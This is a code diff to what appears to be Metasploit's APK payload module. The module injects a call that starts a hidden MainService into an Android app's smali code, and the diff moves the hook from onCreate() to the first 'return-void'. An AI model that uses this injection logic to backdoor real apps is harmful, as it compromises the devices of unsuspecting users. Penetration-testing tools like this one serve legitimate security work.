@@ -198,12 +198,12 @@ class Msf::Payload::Apk
     end
 
     unless activitysmali
-      raise RuntimeError, "Unable to find hook point in #{smalifiles}\n"
+      raise RuntimeError, "Unable to find hookable activity in #{smalifiles}\n"
     end
 
-    entrypoint = ';->onCreate(Landroid/os/Bundle;)V'
+    entrypoint = 'return-void'
     unless activitysmali.include? entrypoint
-      raise RuntimeError, "Unable to find onCreate() in #{smalifile}\n"
+      raise RuntimeError, "Unable to find hookable function in #{smalifile}\n"
     end
 
     # Remove unused files
@@ -226,10 +226,10 @@ class Msf::Payload::Apk
       File.open(newfilename, "wb") {|file| file.puts newsmali }
     end
 
-    payloadhook = entrypoint + %Q^
-    invoke-static {}, L#{package_slash}/MainService;->start()V
-    ^
-    hookedsmali = activitysmali.gsub(entrypoint, payloadhook)
+    payloadhook = %Q^invoke-static {}, L#{package_slash}/MainService;->start()V
+
+    ^ + entrypoint
+    hookedsmali = activitysmali.sub(entrypoint, payloadhook)
 
     print_status "Loading #{smalifile} and injecting payload..\n"
     File.open(smalifile, "wb") {|file| file.puts hookedsmali }
